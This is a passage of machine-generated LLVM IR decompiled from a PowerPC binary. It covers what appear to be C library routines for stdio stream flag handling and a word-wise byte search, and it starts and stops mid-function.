  %v3_1000bcb4 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000bcbc = and i16 %v3_1000bcb4, 4
  %v3_1000bcbc = icmp eq i16 %v1_1000bcbc, 0
  br i1 %v3_1000bcbc, label %dec_label_pc_1000bcc4, label %dec_label_pc_1000bcfc

dec_label_pc_1000bcc4:                            ; preds = %dec_label_pc_1000bc9c
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1000bcd0, label %dec_label_pc_1000bcc8

dec_label_pc_1000bcc8:                            ; preds = %dec_label_pc_1000bcc4
  br label %dec_label_pc_1000bcd0

dec_label_pc_1000bcd0:                            ; preds = %dec_label_pc_1000bcc4, %dec_label_pc_1000bcc8
  %v1_1000bcd0 = add i32 %tmp, 4
  %v2_1000bcd0 = inttoptr i32 %v1_1000bcd0 to i32*
  %v3_1000bcd0 = load i32, i32* %v2_1000bcd0, align 4
  store i32 %v3_1000bcd0, i32* %r3.global-to-local, align 4
  store i32 268483800, i32* @lr, align 4
  %v1_1000bcd4 = call i32 @function_1000cfac(i32 %v3_1000bcd0)
  store i32 %v1_1000bcd4, i32* %r3.global-to-local, align 4
  %v2_1000bcd8 = icmp sgt i32 %v1_1000bcd4, 0
  br i1 %v2_1000bcd8, label %dec_label_pc_1000bcfc, label %dec_label_pc_1000bce0

dec_label_pc_1000bce0:                            ; preds = %dec_label_pc_1000bcd0
  %v3_1000bcd8 = icmp eq i32 %v1_1000bcd4, 0
  %v0_1000bce0 = load i32, i32* @r31, align 4
  %v1_1000bce0 = inttoptr i32 %v0_1000bce0 to i16*
  %v2_1000bce0 = load i16, i16* %v1_1000bce0, align 2
  br i1 %v3_1000bcd8, label %dec_label_pc_1000bce8, label %dec_label_pc_1000bcf0

dec_label_pc_1000bce8:                            ; preds = %dec_label_pc_1000bce0
  %v1_1000bce8 = or i16 %v2_1000bce0, 4
  br label %dec_label_pc_1000bcf8

dec_label_pc_1000bcf0:                            ; preds = %dec_label_pc_1000bce0
  %v1_1000bcf0 = or i16 %v2_1000bce0, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bcf8

dec_label_pc_1000bcf8:                            ; preds = %dec_label_pc_1000bce8, %dec_label_pc_1000bcf0
  %v1_1000bce8.sink.off0 = phi i16 [ %v1_1000bce8, %dec_label_pc_1000bce8 ], [ %v1_1000bcf0, %dec_label_pc_1000bcf0 ]
  store i16 %v1_1000bce8.sink.off0, i16* %v1_1000bce0, align 2
  %v0_1000bd0c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bcfc

dec_label_pc_1000bcfc:                            ; preds = %dec_label_pc_1000bc9c, %dec_label_pc_1000bcd0, %dec_label_pc_1000bcf8
  %v0_1000bd0c = phi i32 [ 0, %dec_label_pc_1000bc9c ], [ %v1_1000bcd4, %dec_label_pc_1000bcd0 ], [ %v0_1000bd0c.pre, %dec_label_pc_1000bcf8 ]
  store i32 %v0_1000bca8, i32* @r31, align 4
  ret i32 %v0_1000bd0c

; uselistorder directives
  uselistorder i16 %v2_1000bce0, { 1, 0 }
  uselistorder i32 %v1_1000bcd4, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_1000bcfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bcf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bcd0, { 1, 0 }
}

define i32 @function_1000bd10(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000bd10:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000bd28 = load i16, i16* %arg1, align 2
  %v4_1000bd28 = zext i16 %v3_1000bd28 to i32
  %tmp9 = urem i16 %v3_1000bd28, 4
  %v3_1000bd2c = icmp eq i16 %tmp9, 0
  br i1 %v3_1000bd2c, label %dec_label_pc_1000bd78, label %dec_label_pc_1000bd34

dec_label_pc_1000bd34:                            ; preds = %dec_label_pc_1000bd10
  %v1_1000bd2c = zext i16 %tmp9 to i32
  %v1_1000bd34 = add nsw i32 %v1_1000bd2c, -1
  store i32 %v1_1000bd34, i32* %r10.global-to-local, align 4
  %v4_1000bd34 = icmp eq i32 %v1_1000bd34, 0
  br i1 %v4_1000bd34, label %dec_label_pc_1000bd78, label %dec_label_pc_1000bd3c

dec_label_pc_1000bd3c:                            ; preds = %dec_label_pc_1000bd34
  %v1_1000bd3c = and i32 %v4_1000bd28, 2048
  %v3_1000bd3c = icmp eq i32 %v1_1000bd3c, 0
  br i1 %v3_1000bd3c, label %dec_label_pc_1000bd78, label %dec_label_pc_1000bd44

dec_label_pc_1000bd44:                            ; preds = %dec_label_pc_1000bd3c
  %v2_1000bd44 = icmp sgt i32 %v1_1000bd34, 1
  br i1 %v2_1000bd44, label %dec_label_pc_1000bdf0, label %dec_label_pc_1000bd4c

dec_label_pc_1000bd4c:                            ; preds = %dec_label_pc_1000bd44
  %v2_1000bd4c = add i32 %tmp, 40
  %v3_1000bd4c = inttoptr i32 %v2_1000bd4c to i32*
  %v4_1000bd4c = load i32, i32* %v3_1000bd4c, align 4
  %v3_1000bd50 = icmp eq i32 %v4_1000bd4c, 0
  br i1 %v3_1000bd50, label %dec_label_pc_1000bd58, label %dec_label_pc_1000bdf0

dec_label_pc_1000bd58:                            ; preds = %dec_label_pc_1000bd4c
  %v2_1000bd58 = add i32 %tmp, 44
  %v3_1000bd58 = inttoptr i32 %v2_1000bd58 to i32*
  %v4_1000bd58 = load i32, i32* %v3_1000bd58, align 4
  %v2_1000bd5c = add i32 %tmp, 3
  %v3_1000bd5c = inttoptr i32 %v2_1000bd5c to i8*
  %v4_1000bd5c = load i8, i8* %v3_1000bd5c, align 1
  %v5_1000bd5c = zext i8 %v4_1000bd5c to i32
  %v2_1000bd64 = sub nsw i32 %v1_1000bd34, %v5_1000bd5c
  %v1_1000bd68 = add nsw i32 %v2_1000bd64, -1
  store i32 %v1_1000bd68, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000bd58, 1
  br i1 %tmp7, label %dec_label_pc_1000bd78, label %dec_label_pc_1000bd70

dec_label_pc_1000bd70:                            ; preds = %dec_label_pc_1000bd58
  %v2_1000bd70 = add i32 %tmp, 2
  %v3_1000bd70 = inttoptr i32 %v2_1000bd70 to i8*
  %v4_1000bd70 = load i8, i8* %v3_1000bd70, align 1
  %v5_1000bd70 = zext i8 %v4_1000bd70 to i32
  %v2_1000bd74 = sub nsw i32 %v1_1000bd68, %v5_1000bd70
  store i32 %v2_1000bd74, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000bd78

dec_label_pc_1000bd78:                            ; preds = %dec_label_pc_1000bd58, %dec_label_pc_1000bd3c, %dec_label_pc_1000bd34, %dec_label_pc_1000bd10, %dec_label_pc_1000bd70
  %v0_1000bd9c = phi i32 [ %v1_1000bd68, %dec_label_pc_1000bd58 ], [ %v1_1000bd34, %dec_label_pc_1000bd3c ], [ 0, %dec_label_pc_1000bd34 ], [ 0, %dec_label_pc_1000bd10 ], [ %v2_1000bd74, %dec_label_pc_1000bd70 ]
  %v1_1000bd78 = and i32 %v4_1000bd28, 64
  %v3_1000bd78 = icmp eq i32 %v1_1000bd78, 0
  %storemerge.in.in.v = select i1 %v3_1000bd78, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000bd8c = add i32 %tmp, 16
  %v3_1000bd8c = inttoptr i32 %v2_1000bd8c to i32*
  %v4_1000bd8c = load i32, i32* %v3_1000bd8c, align 4
  %v1_1000bd90 = inttoptr i32 %arg2 to i32*
  %v2_1000bd90 = load i32, i32* %v1_1000bd90, align 4
  store i32 %v2_1000bd90, i32* %r4.global-to-local, align 4
  %v2_1000bd94 = sub i32 %storemerge, %v4_1000bd8c
  %v1_1000bd98 = add i32 %arg2, 4
  %v2_1000bd98 = inttoptr i32 %v1_1000bd98 to i32*
  %v3_1000bd98 = load i32, i32* %v2_1000bd98, align 4
  store i32 %v3_1000bd98, i32* %r5.global-to-local, align 4
  %v2_1000bd9c = add i32 %v2_1000bd94, %v0_1000bd9c
  store i32 %v2_1000bd9c, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000bd9c, 0
  %v1_1000bda4 = zext i1 %tmp10 to i32
  %v2_1000bda4 = ashr i32 %v2_1000bd9c, 31
  %v3_1000bda4 = and i32 %v2_1000bda4, -2
  %v4_1000bda4 = or i32 %v3_1000bda4, %v1_1000bda4
  %v2_1000bda8 = sub i32 %v3_1000bd98, %v2_1000bd9c
  %v3_1000bda8 = sub i32 -1, %v2_1000bd9c
  store i32 %v2_1000bda8, i32* %r10.global-to-local, align 4
  %v6_1000bda8 = icmp ule i32 %v2_1000bda8, %v3_1000bda8
  %v2_1000bdac = sub nsw i32 -1, %v4_1000bda4
  %v3_1000bdac = add i32 %v2_1000bd90, %v2_1000bdac
  %v5_1000bdac = zext i1 %v6_1000bda8 to i32
  %v6_1000bdac = add i32 %v3_1000bdac, %v5_1000bdac
  store i32 %v6_1000bdac, i32* %v1_1000bd90, align 4
  %v0_1000bdb4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bdb4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bdb4 = add i32 %v1_1000bdb4, 4
  %v3_1000bdb4 = inttoptr i32 %v2_1000bdb4 to i32*
  store i32 %v0_1000bdb4, i32* %v3_1000bdb4, align 4
  %v0_1000bdb8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bdb8 = inttoptr i32 %v0_1000bdb8 to i32*
  %v2_1000bdb8 = load i32, i32* %v1_1000bdb8, align 4
  %v1_1000bdbc = load i32, i32* %r4.global-to-local, align 4
  %v3_1000bdbc = icmp sgt i32 %v2_1000bdb8, %v1_1000bdbc
  br i1 %v3_1000bdbc, label %dec_label_pc_1000bdd4, label %dec_label_pc_1000bdc4

dec_label_pc_1000bdc4:                            ; preds = %dec_label_pc_1000bd78
  %v4_1000bdbc = icmp eq i32 %v2_1000bdb8, %v1_1000bdbc
  br i1 %v4_1000bdbc, label %dec_label_pc_1000bdc8, label %dec_label_pc_1000bdd8thread-pre-split

dec_label_pc_1000bdc8:                            ; preds = %dec_label_pc_1000bdc4
  %v1_1000bdc8 = add i32 %v0_1000bdb8, 4
  %v2_1000bdc8 = inttoptr i32 %v1_1000bdc8 to i32*
  %v3_1000bdc8 = load i32, i32* %v2_1000bdc8, align 4
  %v1_1000bdcc = load i32, i32* %r5.global-to-local, align 4
  %v3_1000bdcc = icmp ugt i32 %v3_1000bdc8, %v1_1000bdcc
  br i1 %v3_1000bdcc, label %dec_label_pc_1000bdd4, label %dec_label_pc_1000bdd8thread-pre-split

dec_label_pc_1000bdd4:                            ; preds = %dec_label_pc_1000bdc8, %dec_label_pc_1000bd78
  %v0_1000bdd4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000bdd4 = sub i32 0, %v0_1000bdd4
  store i32 %v1_1000bdd4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bdd8

dec_label_pc_1000bdd8thread-pre-split:            ; preds = %dec_label_pc_1000bdc4, %dec_label_pc_1000bdc8
  %v0_1000bdd8.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bdd8

dec_label_pc_1000bdd8:                            ; preds = %dec_label_pc_1000bdd8thread-pre-split, %dec_label_pc_1000bdd4
  %v0_1000bdd8 = phi i32 [ %v0_1000bdd8.pr, %dec_label_pc_1000bdd8thread-pre-split ], [ %v1_1000bdd4, %dec_label_pc_1000bdd4 ]
  %tmp8 = icmp sgt i32 %v0_1000bdd8, -1
  br i1 %tmp8, label %dec_label_pc_1000bdf4, label %dec_label_pc_1000bde0

dec_label_pc_1000bde0:                            ; preds = %dec_label_pc_1000bdd8
  %v0_1000bde0 = call i32 @function_10004e38()
  %v2_1000bde8 = inttoptr i32 %v0_1000bde0 to i32*
  store i32 75, i32* %v2_1000bde8, align 4
  %v0_1000bdf8.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bdf4

dec_label_pc_1000bdf0:                            ; preds = %dec_label_pc_1000bd4c, %dec_label_pc_1000bd44
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bdf4

dec_label_pc_1000bdf4:                            ; preds = %dec_label_pc_1000bdd8, %dec_label_pc_1000bde0, %dec_label_pc_1000bdf0
  %v0_1000bdf8 = phi i32 [ %v0_1000bdd8, %dec_label_pc_1000bdd8 ], [ %v0_1000bdf8.pre, %dec_label_pc_1000bde0 ], [ -1, %dec_label_pc_1000bdf0 ]
  ret i32 %v0_1000bdf8

; uselistorder directives
  uselistorder i32 %v2_1000bdb8, { 1, 0 }
  uselistorder i32 %v2_1000bd9c, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000bdf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bdd8thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd78, { 4, 0, 1, 2, 3 }
}

define i32 @function_1000be0c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000be0c:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000be0c = load i32, i32* @lr, align 4
  store i32 %v0_1000be0c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000be20 = add i32 %arg1, 8
  %v2_1000be20 = inttoptr i32 %v1_1000be20 to i32*
  %v3_1000be20 = load i32, i32* %v2_1000be20, align 4
  %v1_1000be24 = add i32 %arg1, 12
  %v2_1000be24 = inttoptr i32 %v1_1000be24 to i32*
  %v3_1000be24 = load i32, i32* %v2_1000be24, align 4
  %v2_1000be28 = sub i32 %v3_1000be24, %v3_1000be20
  store i32 268484144, i32* @lr, align 4
  %v3_1000be2c = inttoptr i32 %v3_1000be20 to i16*
  %v4_1000be2c = call i32 @function_1000bc9c(i16* %v3_1000be2c, i32 %v2_1000be28, i32 %v2_1000be28)
  %v0_1000be30 = load i32, i32* @r29, align 4
  %v1_1000be30 = add i32 %v0_1000be30, 8
  %v2_1000be30 = inttoptr i32 %v1_1000be30 to i32*
  %v3_1000be30 = load i32, i32* %v2_1000be30, align 4
  %v2_1000be34 = add i32 %v3_1000be30, %v4_1000be2c
  store i32 %v2_1000be34, i32* %r0.global-to-local, align 4
  %v2_1000be38 = add i32 %v0_1000be30, 16
  %v3_1000be38 = inttoptr i32 %v2_1000be38 to i32*
  store i32 %v3_1000be30, i32* %v3_1000be38, align 4
  %v0_1000be3c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000be3c = load i32, i32* @r29, align 4
  %v2_1000be3c = add i32 %v1_1000be3c, 20
  %v3_1000be3c = inttoptr i32 %v2_1000be3c to i32*
  store i32 %v0_1000be3c, i32* %v3_1000be3c, align 4
  store i32 %v0_1000be0c, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000be2c

; uselistorder directives
  uselistorder i32 %v3_1000be30, { 1, 0 }
  uselistorder i32 %v4_1000be2c, { 1, 0 }
  uselistorder i32 %v3_1000be20, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1000be54(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000be54:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1000be5c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000be68 = load i16, i16* %arg1, align 2
  %v4_1000be68 = zext i16 %v3_1000be68 to i32
  %v2_1000be6c = and i32 %v4_1000be68, %arg2
  %v5_1000be6c = icmp eq i32 %v2_1000be6c, 0
  br i1 %v5_1000be6c, label %dec_label_pc_1000be74, label %dec_label_pc_1000be84

dec_label_pc_1000be74:                            ; preds = %dec_label_pc_1000be54
  %v1_1000be74 = and i32 %v4_1000be68, 2176
  %v3_1000be74 = icmp eq i32 %v1_1000be74, 0
  br i1 %v3_1000be74, label %dec_label_pc_1000be7c, label %dec_label_pc_1000be90

dec_label_pc_1000be7c:                            ; preds = %dec_label_pc_1000be74
  %v2_1000be7c = or i32 %v4_1000be68, %arg2
  %v1_1000be80 = trunc i32 %v2_1000be7c to i16
  store i16 %v1_1000be80, i16* %arg1, align 2
  %v0_1000be84.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000be84

dec_label_pc_1000be84:                            ; preds = %dec_label_pc_1000be54, %dec_label_pc_1000be7c
  %v0_1000be84 = phi i32 [ %tmp, %dec_label_pc_1000be54 ], [ %v0_1000be84.pre, %dec_label_pc_1000be7c ]
  %v1_1000be84 = inttoptr i32 %v0_1000be84 to i16*
  %v2_1000be84 = load i16, i16* %v1_1000be84, align 2
  %v3_1000be84 = zext i16 %v2_1000be84 to i32
  %v1_1000be88 = and i32 %v3_1000be84, 16
  %v3_1000be88 = icmp eq i32 %v1_1000be88, 0
  br i1 %v3_1000be88, label %dec_label_pc_1000beac, label %dec_label_pc_1000be90

dec_label_pc_1000be90:                            ; preds = %dec_label_pc_1000be74, %dec_label_pc_1000be84
  %v0_1000be90 = call i32 @function_10004e38()
  store i32 %v0_1000be90, i32* %r3.global-to-local, align 4
  %v2_1000be98 = inttoptr i32 %v0_1000be90 to i32*
  store i32 9, i32* %v2_1000be98, align 4
  br label %dec_label_pc_1000be9c

dec_label_pc_1000be9c:                            ; preds = %dec_label_pc_1000beb4, %dec_label_pc_1000be90
  %v0_1000be9c = load i32, i32* @r31, align 4
  %v1_1000be9c = inttoptr i32 %v0_1000be9c to i16*
  %v2_1000be9c = load i16, i16* %v1_1000be9c, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000bea4 = or i16 %v2_1000be9c, 8
  br label %dec_label_pc_1000bee0

dec_label_pc_1000beac:                            ; preds = %dec_label_pc_1000be84
  %v1_1000beac = and i32 %v3_1000be84, 64
  %v3_1000beac = icmp eq i32 %v1_1000beac, 0
  br i1 %v3_1000beac, label %dec_label_pc_1000bed4, label %dec_label_pc_1000beb4

dec_label_pc_1000beb4:                            ; preds = %dec_label_pc_1000beac
  store i32 268484280, i32* @lr, align 4
  %v0_1000beb4 = call i32 @function_10005834()
  store i32 %v0_1000beb4, i32* %r3.global-to-local, align 4
  %v3_1000beb8 = icmp eq i32 %v0_1000beb4, 0
  br i1 %v3_1000beb8, label %dec_label_pc_1000bec0, label %dec_label_pc_1000be9c

dec_label_pc_1000bec0:                            ; preds = %dec_label_pc_1000beb4
  %v0_1000bec0 = load i32, i32* @r31, align 4
  %v1_1000bec0 = inttoptr i32 %v0_1000bec0 to i16*
  %v2_1000bec0 = load i16, i16* %v1_1000bec0, align 2
  %v3_1000bec0 = zext i16 %v2_1000bec0 to i32
  %v1_1000bec4 = add i32 %v0_1000bec0, 8
  %v2_1000bec4 = inttoptr i32 %v1_1000bec4 to i32*
  %v3_1000bec4 = load i32, i32* %v2_1000bec4, align 4
  %v1_1000bec8 = call i32 @__asm_rlwinm(i32 %v3_1000bec0, i32 0, i32 26, i32 24)
  %v2_1000bec8 = trunc i32 %v1_1000bec8 to i16
  %v1_1000becc = load i32, i32* @r31, align 4
  %v2_1000becc = add i32 %v1_1000becc, 28
  %v3_1000becc = inttoptr i32 %v2_1000becc to i32*
  store i32 %v3_1000bec4, i32* %v3_1000becc, align 4
  %v3_1000bed0 = load i32, i32* @r31, align 4
  %v4_1000bed0 = inttoptr i32 %v3_1000bed0 to i16*
  store i16 %v2_1000bec8, i16* %v4_1000bed0, align 2
  %v0_1000bed4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bed4

dec_label_pc_1000bed4:                            ; preds = %dec_label_pc_1000beac, %dec_label_pc_1000bec0
  %v0_1000bed4 = phi i32 [ %v0_1000be84, %dec_label_pc_1000beac ], [ %v0_1000bed4.pre, %dec_label_pc_1000bec0 ]
  %v1_1000bed4 = inttoptr i32 %v0_1000bed4 to i16*
  %v2_1000bed4 = load i16, i16* %v1_1000bed4, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000bedc = or i16 %v2_1000bed4, 1
  br label %dec_label_pc_1000bee0

dec_label_pc_1000bee0:                            ; preds = %dec_label_pc_1000be9c, %dec_label_pc_1000bed4
  %v2_1000bee0 = phi i32 [ %v0_1000be9c, %dec_label_pc_1000be9c ], [ %v0_1000bed4, %dec_label_pc_1000bed4 ]
  %storemerge.off0 = phi i16 [ %v1_1000bea4, %dec_label_pc_1000be9c ], [ %v1_1000bedc, %dec_label_pc_1000bed4 ]
  %v3_1000bee0 = inttoptr i32 %v2_1000bee0 to i16*
  store i16 %storemerge.off0, i16* %v3_1000bee0, align 2
  store i32 %v0_1000be5c, i32* @r31, align 4
  %v0_1000bef4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000bef4

; uselistorder directives
  uselistorder i32 %v4_1000be68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 1, 2, 3, 5, 6, 7, 0 }
  uselistorder i32 ()* @function_10005834, { 8, 5, 2, 1, 4, 3, 7, 6, 0 }
  uselistorder i32 64, { 0, 4, 5, 6, 7, 1, 2, 8, 3 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bee0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bed4, { 1, 0 }
  uselistorder label %dec_label_pc_1000be90, { 1, 0 }
  uselistorder label %dec_label_pc_1000be84, { 1, 0 }
}

define i32 @function_1000bef8(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bef8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000bef8 = load i32, i32* @lr, align 4
  store i32 %v0_1000bef8, i32* %r0.global-to-local, align 4
  %v0_1000bf04 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000bf10 = add i32 %arg1, 4
  %v2_1000bf10 = inttoptr i32 %v1_1000bf10 to i32*
  %v3_1000bf10 = load i32, i32* %v2_1000bf10, align 4
  %v2_1000bf14 = load i32, i32* %arg2, align 4
  %v1_1000bf18 = add i32 %tmp, 4
  %v2_1000bf18 = inttoptr i32 %v1_1000bf18 to i32*
  %v3_1000bf18 = load i32, i32* %v2_1000bf18, align 4
  store i32 268484384, i32* @lr, align 4
  %v4_1000bf1c = call i32 @function_1000cf2c(i32 %v3_1000bf10, i32 %v2_1000bf14, i32 %v3_1000bf18, i32 %arg3)
  %v1_1000bf20 = icmp slt i32 %v4_1000bf1c, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000bf20, label %dec_label_pc_1000bf38, label %dec_label_pc_1000bf2c

dec_label_pc_1000bf2c:                            ; preds = %dec_label_pc_1000bef8
  %v1_1000bf2c = load i32, i32* @r31, align 4
  %v2_1000bf2c = inttoptr i32 %v1_1000bf2c to i32*
  store i32 %v4_1000bf1c, i32* %v2_1000bf2c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000bf34 = load i32, i32* @r31, align 4
  %v2_1000bf34 = add i32 %v1_1000bf34, 4
  %v3_1000bf34 = inttoptr i32 %v2_1000bf34 to i32*
  store i32 %tmp, i32* %v3_1000bf34, align 4
  %v0_1000bf38.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bf38

dec_label_pc_1000bf38:                            ; preds = %dec_label_pc_1000bef8, %dec_label_pc_1000bf2c
  %v0_1000bf38 = phi i32 [ %tmp, %dec_label_pc_1000bef8 ], [ %v0_1000bf38.pre, %dec_label_pc_1000bf2c ]
  store i32 %v0_1000bef8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000bf04, i32* @r31, align 4
  ret i32 %v0_1000bf38

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000bf38, { 1, 0 }
}

define i32 @function_1000bf50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bf50:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000bf50 = urem i32 %arg1, 256
  store i32 %v1_1000bf50, i32* %r4.global-to-local, align 4
  %v0_1000bf681 = load i32, i32* @r3, align 4
  %v1_1000bf682 = urem i32 %v0_1000bf681, 4
  %v3_1000bf684 = icmp eq i32 %v1_1000bf682, 0
  br i1 %v3_1000bf684, label %dec_label_pc_1000bf70, label %dec_label_pc_1000bf58

dec_label_pc_1000bf58:                            ; preds = %dec_label_pc_1000bf50, %dec_label_pc_1000bf58
  %v1_1000bf5c = phi i32 [ %v0_1000bf70.pre, %dec_label_pc_1000bf58 ], [ %v1_1000bf50, %dec_label_pc_1000bf50 ]
  %v0_1000bf58 = phi i32 [ %v1_1000bf64, %dec_label_pc_1000bf58 ], [ %v0_1000bf681, %dec_label_pc_1000bf50 ]
  %v1_1000bf58 = inttoptr i32 %v0_1000bf58 to i8*
  %v2_1000bf58 = load i8, i8* %v1_1000bf58, align 1
  %v3_1000bf58 = zext i8 %v2_1000bf58 to i32
  %v4_1000bf5c = icmp eq i32 %v3_1000bf58, %v1_1000bf5c
  %v0_1000bf60 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000bf5c, i32 %v0_1000bf60)
  %v0_1000bf64 = load i32, i32* @r3, align 4
  %v1_1000bf64 = add i32 %v0_1000bf64, 1
  store i32 %v1_1000bf64, i32* @r3, align 4
  %v1_1000bf68 = urem i32 %v1_1000bf64, 4
  %v3_1000bf68 = icmp eq i32 %v1_1000bf68, 0
  %v0_1000bf70.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000bf68, label %dec_label_pc_1000bf70, label %dec_label_pc_1000bf58

dec_label_pc_1000bf70:                            ; preds = %dec_label_pc_1000bf58, %dec_label_pc_1000bf50
  %v0_1000bf889 = phi i32 [ %v0_1000bf681, %dec_label_pc_1000bf50 ], [ %v1_1000bf64, %dec_label_pc_1000bf58 ]
  %v0_1000bf70 = phi i32 [ %v1_1000bf50, %dec_label_pc_1000bf50 ], [ %v0_1000bf70.pre, %dec_label_pc_1000bf58 ]
  %v1_1000bf70 = mul i32 %v0_1000bf70, 256
  %v2_1000bf78 = or i32 %v1_1000bf70, %v0_1000bf70
  %v1_1000bf80 = mul i32 %v2_1000bf78, 65536
  %v2_1000bf84 = or i32 %v1_1000bf80, %v2_1000bf78
  br label %dec_label_pc_1000bf88

dec_label_pc_1000bf88:                            ; preds = %dec_label_pc_1000bff4, %dec_label_pc_1000bf88, %dec_label_pc_1000bf70
  %v0_1000bfc4 = phi i32 [ %v0_1000bf889, %dec_label_pc_1000bf70 ], [ %v1_1000bf8c, %dec_label_pc_1000bf88 ], [ %v1_1000bf8c, %dec_label_pc_1000bff4 ]
  %v1_1000bf88 = inttoptr i32 %v0_1000bfc4 to i32*
  %v2_1000bf88 = load i32, i32* %v1_1000bf88, align 4
  %v1_1000bf8c = add i32 %v0_1000bfc4, 4
  %v1_1000bf90 = add i32 %v0_1000bfc4, 2
  %v2_1000bf94 = xor i32 %v2_1000bf88, %v2_1000bf84
  %v1_1000bf9c = add i32 %v2_1000bf94, 2130640639
  %v2_1000bfa0 = xor i32 %v1_1000bf9c, %v2_1000bf94
  %v1_1000bfa4 = add i32 %v0_1000bfc4, 1
  %v2_1000bfa8 = and i32 %v2_1000bfa0, -2130640640
  %v6_1000bfa8 = icmp eq i32 %v2_1000bfa8, -2130640640
  br i1 %v6_1000bfa8, label %dec_label_pc_1000bf88, label %dec_label_pc_1000bfb4

dec_label_pc_1000bfb4:                            ; preds = %dec_label_pc_1000bf88
  %v2_1000bfb4 = inttoptr i32 %v0_1000bfc4 to i8*
  %v3_1000bfb4 = load i8, i8* %v2_1000bfb4, align 1
  %v4_1000bfb4 = zext i8 %v3_1000bfb4 to i32
  %v1_1000bfb8 = add i32 %v0_1000bfc4, 3
  %v4_1000bfbc = icmp eq i32 %v4_1000bfb4, %v0_1000bf70
  br i1 %v4_1000bfbc, label %dec_label_pc_1000bfc4, label %dec_label_pc_1000bfcc

dec_label_pc_1000bfc4:                            ; preds = %dec_label_pc_1000bfb4
  ret i32 %v0_1000bfc4

dec_label_pc_1000bfcc:                            ; preds = %dec_label_pc_1000bfb4
  %v2_1000bfcc = inttoptr i32 %v1_1000bfa4 to i8*
  %v3_1000bfcc = load i8, i8* %v2_1000bfcc, align 1
  %v4_1000bfcc = zext i8 %v3_1000bfcc to i32
  %v4_1000bfd0 = icmp eq i32 %v4_1000bfcc, %v0_1000bf70
  br i1 %v4_1000bfd0, label %dec_label_pc_1000bfd8, label %dec_label_pc_1000bfe0

dec_label_pc_1000bfd8:                            ; preds = %dec_label_pc_1000bfcc
